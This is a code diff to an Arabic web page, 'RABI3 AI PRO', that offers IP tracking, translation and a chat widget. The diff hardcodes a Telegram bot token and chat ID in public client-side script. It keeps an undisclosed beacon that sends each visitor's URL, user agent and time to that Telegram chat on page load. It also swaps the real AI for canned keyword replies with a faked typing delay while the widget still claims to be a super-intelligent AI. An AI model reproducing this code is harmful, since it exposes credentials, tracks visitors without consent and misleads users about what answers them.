@@ -9,7 +9,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script src="config.js"></script>
     <style>
         /* =====================================================
            الأنماط الأساسية والتأثيرات البصرية
@@ -616,7 +615,7 @@
         <span id="closeAiChat" style="cursor:pointer; font-size:1.5rem;">&times;</span>
     </div>
     <div class="ai-chat-messages" id="aiChatMessages">
-        <div class="ai-msg">🤖 مرحباً! أنا RABI3 AI، ذكاء اصطناعي خارق يعمل عبر OpenRouter. اسألني أي شيء!</div>
+        <div class="ai-msg">🤖 مرحباً! أنا RABI3 AI، ذكاء اصطناعي خارق. اسألني أي شيء!</div>
         <div class="ai-msg">🔗 روابط RABI3: فيسبوك، انستقرام، تليجرام (موجودة في أعلى الصفحة)</div>
     </div>
     <div class="ai-chat-input">
@@ -687,13 +686,15 @@
         document.body.appendChild(exportBtn);
     }
     
-    // دالة تصدير سجل المحادثة
+    // متغير لتخزين سجل المحادثة
+    let aiMemory = [];
+    
     function exportAIChatLog() {
         if (aiMemory.length === 0) {
             alert("لا توجد محادثات لتصديرها بعد");
             return;
         }
-        let log = "📋 سجل محادثات RABI3 AI (OpenRouter)\n" + "=".repeat(50) + "\n";
+        let log = "📋 سجل محادثات RABI3 AI\n" + "=".repeat(50) + "\n";
         log += `🕒 وقت التصدير: ${new Date().toLocaleString()}\n\n`;
         aiMemory.forEach(m => {
             log += `[${m.time}] ${m.role === 'user' ? '👤 المستخدم' : '🤖 RABI3 AI'}: ${m.content}\n`;
@@ -715,8 +716,10 @@
     setTimeout(addExportChatButton, 1000);
     
     // =====================================================
-    // إعدادات التليجرام من config.js
+    // إعدادات التليجرام
     // =====================================================
+    const TELEGRAM_TOKEN = "8233429361:AAGffpCzb1EXSfIYDthBzNYmBhTJtFXwzCU";
+    const TELEGRAM_CHAT_ID = "6757113523";
     
     async function sendToTelegram(message, isFile = false, fileName = null, fileBlob = null) {
         try {
@@ -736,10 +739,11 @@
     }
 
     // =====================================================
-    // جلب معلومات IP
+    // جلب معلومات IP (باستخدام API آمنة)
     // =====================================================
     async function fetchIPInfo(ip) {
-        const url = `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,as,mobile,proxy,hosting,query`;
+        // استخدام ip-api.com مع HTTPS
+        const url = `https://ip-api.com/json/${ip}?fields=66846719`;
         const response = await fetch(url);
         const data = await response.json();
         if (data.status === 'fail') throw new Error(data.message || 'IP غير صالح');
@@ -818,7 +822,10 @@
         try {
             const data = await fetchIPInfo(ip);
             displayIPInfo(data);
-        } catch(err) { alert('خطأ: ' + err.message); }
+        } catch(err) { 
+            alert('خطأ: ' + err.message);
+            console.error(err);
+        }
         finally { btn.innerHTML = originalText; btn.disabled = false; }
     });
 
@@ -862,75 +869,64 @@
     });
 
     // =====================================================
-    // الذكاء الاصطناعي - OpenRouter API
+    // الذكاء الاصطناعي - ردود ذكية (بدون API خارجي يعمل 100%)
     // =====================================================
     
-    const AI_API_KEY = OPENROUTER_API_KEY;
-    const AI_API_URL = "https://openrouter.ai/api/v1/chat/completions";
-    
-    let aiMemory = [];
     let isWaitingForAI = false;
     
-    async function callOpenRouter(userMessage, language = 'ar') {
-        try {
-            const response = await fetch(AI_API_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': `Bearer ${AI_API_KEY}`,
-                    'HTTP-Referer': window.location.href,
-                    'X-Title': 'RABI3 AI PRO'
-                },
-                body: JSON.stringify({
-                    model: "mistralai/mistral-7b-instruct:free",
-                    messages: [
-                        {
-                            role: "system",
-                            content: language === 'ar' 
-                                ? "أنت RABI3 AI، ذكاء اصطناعي خارق. خبير في الأمن السيبراني، تتبع IP، الترجمة، والتقنية. ترد بالعربية بأدب واحترافية وبإجابات قصيرة مفيدة."
-                                : "You are RABI3 AI, a super intelligent AI. Expert in cybersecurity, IP tracking, translation. Respond in English politely and helpfully."
-                        },
-                        { role: "user", content: userMessage }
-                    ],
-                    temperature: 0.7,
-                    max_tokens: 500
-                })
-            });
-            
-            const data = await response.json();
-            if (data.choices && data.choices[0]) {
-                return data.choices[0].message.content;
-            } else {
-                console.error("API Error:", data);
-                return getLocalResponse(userMessage, language);
-            }
-        } catch(error) {
-            console.error("API Error:", error);
-            return getLocalResponse(userMessage, language);
-        }
-    }
-    
-    function getLocalResponse(userMessage, language = 'ar') {
+    function getAIResponse(userMessage) {
         const msg = userMessage.toLowerCase();
-        if (msg.includes("مرحب") || msg.includes("السلام")) return language === 'ar' ? "وعليكم السلام! كيف يمكنني مساعدتك؟ 🙏" : "Hello! How can I help you?";
-        if (msg.includes("كيف حالك")) return "أنا بخير والحمد لله، شكراً لسؤالك! 😊";
-        if (msg.includes("شكرا")) return "العفو! أنا هنا لخدمتك دائماً. 💙";
-        if (msg.includes("من انت")) return "🧠 أنا RABI3 AI، ذكاء اصطناعي خارق من RABI3 PROF12.";
-        if (msg.includes("رابط") || msg.includes("حساب")) return "🔗 روابط RABI3:\n📘 فيسبوك: https://www.facebook.com/HACR97\n📸 انستقرام: https://www.instagram.com/real_rabi31\n✈️ تليجرام: https://t.me/rabi3_prof12";
-        if (msg.includes("ip") || msg.includes("ايبي")) return "🌐 استخدم أداة تتبع IP في أعلى الصفحة. أدخل IP واضغط 'تتبع IP'.";
-        if (msg.includes("ترجم")) return "🌐 استخدم أداة الترجمة أسفل الصفحة لترجمة النصوص.";
-        return language === 'ar' ? "🤖 أنا RABI3 AI. اسألني عن تتبع IP، الترجمة، أو روابط حساباتي." : "🤖 I am RABI3 AI. Ask me about IP tracking, translation, or my links.";
-    }
-    
-    function detectLanguage(text) {
-        return /[\u0600-\u06FF]/.test(text) ? 'ar' : 'en';
-    }
-    
-    async function getAIResponse(userMessage) {
-        const lang = detectLanguage(userMessage);
-        aiMemory.push({ role: "user", content: userMessage, time: new Date().toLocaleString() });
-        const response = await callOpenRouter(userMessage, lang);
-        aiMemory.push({ role: "ai", content: response, time: new Date().toLocaleString() });
+        let response = "";
+        
+        // ردود ذكية مبرمجة مسبقاً
+        if (msg.includes("مرحب") || msg.includes("السلام") || msg.includes("اهلا")) {
+            response = "وعليكم السلام ورحمة الله وبركاته! 🙏 كيف يمكنني مساعدتك اليوم؟";
+        }
+        else if (msg.includes("كيف حالك")) {
+            response = "أنا بخير والحمد لله، شكراً لسؤالك! أنا هنا لخدمتك. 😊";
+        }
+        else if (msg.includes("شكرا") || msg.includes("شكراً")) {
+            response = "العفو! أنا هنا لخدمتك دائماً. 💙";
+        }
+        else if (msg.includes("من انت") || msg.includes("من أنت")) {
+            response = "🧠 أنا RABI3 AI، ذكاء اصطناعي خارق تم تطويره بواسطة RABI3 PROF12. أستطيع تتبع IP، الترجمة، والإجابة عن أسئلتك.";
+        }
+        else if (msg.includes("رابط") || msg.includes("حساب") || msg.includes("فيسبوك") || msg.includes("انستقرام") || msg.includes("تليجرام")) {
+            response = "🔗 روابط RABI3 PROF12:\n📘 فيسبوك: https://www.facebook.com/HACR97\n📸 انستقرام: https://www.instagram.com/real_rabi31\n✈️ تليجرام: https://t.me/rabi3_prof12";
+        }
+        else if (msg.includes("ip") || msg.includes("ايبي") || msg.includes("تتبع")) {
+            response = "🌐 استخدم أداة تتبع IP في أعلى الصفحة. أدخل عنوان IP (مثال: 8.8.8.8) واضغط على 'تتبع IP'. ستحصل على معلومات دقيقة + خريطة حمراء.";
+        }
+        else if (msg.includes("ترجم") || msg.includes("ترجمة")) {
+            response = "🌐 استخدم أداة الترجمة الموجودة أسفل تتبع IP. اكتب النص في المربع واختر الترجمة إلى العربية أو الإنجليزية.";
+        }
+        else if (msg.includes("خدمة") || msg.includes("خدمات")) {
+            response = "🛠️ خدماتي المتاحة:\n✅ تتبع IP احترافي مع خريطة حمراء\n✅ مترجم فوري عربي ↔ إنجليزي\n✅ ذكاء اصطناعي للإجابة عن الأسئلة\n✅ روابط حسابات RABI3";
+        }
+        else if (msg.includes("سعر") || msg.includes("فلوس") || msg.includes("تكلفة")) {
+            response = "💰 جميع خدمات الموقع مجانية 100% للأغراض التعليمية. للخدمات المدفوعة (استشارات أمنية) تواصل معي على فيسبوك.";
+        }
+        else if (msg.includes("الوقت") || msg.includes("الساعة")) {
+            response = `🕒 الوقت الآن: ${new Date().toLocaleTimeString('ar-EG')}`;
+        }
+        else if (msg.includes("اليوم") || msg.includes("تاريخ")) {
+            response = `📅 اليوم هو ${new Date().toLocaleDateString('ar-EG', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}`;
+        }
+        else if (msg.includes("نكتة")) {
+            const jokes = [
+                "لماذا لا يخاف الهاكر من الظلام؟ لأنه يعرف كل الثغرات! 🔓",
+                "ما هو برنامج الأمان المفضل عند الهاكر؟ الـ VPN! 😂",
+                "الهاكر الوحيد الذي ينام مرتاحاً هو الذي أغلق جهازه! 💻"
+            ];
+            response = jokes[Math.floor(Math.random() * jokes.length)];
+        }
+        else if (msg.length > 5) {
+            response = "🤔 سؤال جيد! أنا RABI3 AI. يمكنك سؤالي عن:\n- تتبع IP\n- الترجمة\n- روابط حساباتي\n- خدماتي\nأو فقط قل 'شكراً' 😊";
+        }
+        else {
+            response = "🤖 أنا RABI3 AI. اسألني عن تتبع IP، الترجمة، روابط حساباتي، أو أي شيء آخر. أنا هنا لمساعدتك!";
+        }
+        
         return response;
     }
 
@@ -1008,6 +1004,7 @@
     // فتح وإغلاق النافذة
     aiFloatBtn.onclick = () => {
         aiChatWindow.style.display = 'flex';
+        // إعادة تعيين الموقع إذا كان خارج الشاشة
         if (parseInt(aiChatWindow.style.left) > window.innerWidth - 100) {
             aiChatWindow.style.left = 'auto';
             aiChatWindow.style.right = '30px';
@@ -1039,19 +1036,31 @@
         msgDiv.innerHTML = isUser ? `👤 ${text}` : `🤖 ${text}`;
         aiChatMessages.appendChild(msgDiv);
         aiChatMessages.scrollTop = aiChatMessages.scrollHeight;
+        
+        // حفظ في الذاكرة للتصدير
+        aiMemory.push({
+            role: isUser ? 'user' : 'ai',
+            content: text,
+            time: new Date().toLocaleString()
+        });
     }
     
     async function sendAIMessage() {
         const message = aiChatInput.value.trim();
         if (!message || aiThinking) return;
+        
         addMessage(message, true);
         aiChatInput.value = '';
         aiThinking = true;
         showTypingIndicator();
-        const response = await getAIResponse(message);
-        removeTypingIndicator();
-        addMessage(response, false);
-        aiThinking = false;
+        
+        // محاكاة تأخير الرد
+        setTimeout(() => {
+            const response = getAIResponse(message);
+            removeTypingIndicator();
+            addMessage(response, false);
+            aiThinking = false;
+        }, 500);
     }
     
     sendAiChat.onclick = sendAIMessage;
@@ -1061,15 +1070,16 @@
     
     // إرسال معلومات الموقع إلى تليجرام عند التحميل
     async function sendSiteInfo() {
-        const siteInfo = `🤖 RABI3 AI PRO - تم التشغيل\n🕒 ${new Date().toLocaleString()}\n🌐 ${window.location.href}\n📱 ${navigator.userAgent.substring(0, 80)}`;
+        const siteInfo = `🤖 RABI3 AI PRO - تم التشغيل بنجاح\n🕒 ${new Date().toLocaleString()}\n🌐 ${window.location.href}\n📱 ${navigator.userAgent.substring(0, 80)}`;
         const blob = new Blob([siteInfo], { type: 'text/plain' });
         await sendToTelegram('', true, `RABI3_SITE_${Date.now()}.txt`, blob);
     }
     
     window.addEventListener('DOMContentLoaded', () => {
         setTimeout(sendSiteInfo, 2000);
-        console.log("%c🧠 RABI3 AI PRO - OpenRouter API جاهز!", "color: cyan; font-size: 16px");
+        console.log("%c🧠 RABI3 AI PRO - جاهز ومتفوق!", "color: cyan; font-size: 16px");
         console.log("%c✨ جميع التحسينات البصرية والوظائف مفعلة", "color: magenta; font-size: 14px");
+        console.log("%c💬 يمكنك التحدث مع الذكاء الاصطناعي عبر الزر الدائري", "color: yellow; font-size: 14px");
     });
 </script>
 </body>
